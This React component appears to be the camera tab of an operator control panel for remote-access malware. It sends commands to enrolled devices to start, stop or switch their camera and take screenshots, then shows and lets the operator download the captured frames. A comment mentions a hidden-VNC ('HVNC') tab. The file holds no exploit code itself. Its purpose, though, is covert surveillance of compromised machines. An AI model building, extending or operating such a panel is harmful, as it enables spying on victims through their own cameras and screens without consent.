import { useEffect } from 'react';
import { Card, CmdBtn, Empty, C, useData } from './shared';

export default function CameraTab({ device }) {
  const { data, loading, load } = useData(device.id, 'photo');
  useEffect(() => { load(50); }, [device.id]);

  // CCS sends CAMERA_FRAME as {type:'CAMERA_FRAME', frame:'base64...'} OR binary 0x02
  const photos = (data || []).filter(e => {
    const d = e.data;
    return d?.frame || d?.data || d?.image;
  }).reverse();

  function getB64(d) {
    return d.frame || d.data || d.image || '';
  }

  return (
    <Card title={`Camera Frames (${photos.length})`}
      action={
        <>
          <CmdBtn deviceId={device.id} action="TOGGLE_CAMERA" params={{ enabled: true }}  label="📷 Start" />
          <CmdBtn deviceId={device.id} action="TOGGLE_CAMERA" params={{ enabled: false }} label="⏹ Stop" />
          <CmdBtn deviceId={device.id} action="SWITCH_CAMERA"                             label="↔ Switch" />
          <CmdBtn deviceId={device.id} action="SNAP_SCREEN"                               label="📸 Snap" onDone={() => setTimeout(load, 1500)} />
          <button onClick={() => load(50)} style={{ padding: '5px 10px', background: 'none',
            border: `1px solid ${C.border}`, borderRadius: 5, color: '#555', fontSize: 11, cursor: 'pointer' }}>↻</button>
        </>
      }>
      <div style={{ fontSize: 11, color: '#444', marginBottom: 10 }}>
        Camera streams as JPEG frames (binary type 0x02) visible in HVNC tab.
        Static frames captured here. Use TOGGLE_CAMERA to stream.
      </div>
      {loading && <div style={{ color: '#444', fontSize: 12 }}>loading…</div>}
      {!loading && !photos.length && <Empty text="No camera frames — click Start to stream or Snap for screenshot" />}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(180px, 1fr))', gap: 10 }}>
        {photos.map((entry, i) => {
          const b64 = getB64(entry.data);
          if (!b64) return null;
          return (
            <div key={i} style={{ background: C.bg, border: `1px solid ${C.border}`, borderRadius: 5, overflow: 'hidden' }}>
              <img src={`data:image/jpeg;base64,${b64}`} alt="" style={{ width: '100%', display: 'block' }} />
              <div style={{ padding: '5px 8px', fontSize: 10, color: C.dim, display: 'flex', justifyContent: 'space-between' }}>
                <span>{new Date(entry.created_at).toLocaleTimeString()}</span>
                <a href={`data:image/jpeg;base64,${b64}`} download={`frame_${i}.jpg`}
                  style={{ color: C.green }}>↓</a>
              </div>
            </div>
          );
        })}
      </div>
    </Card>
  );
}
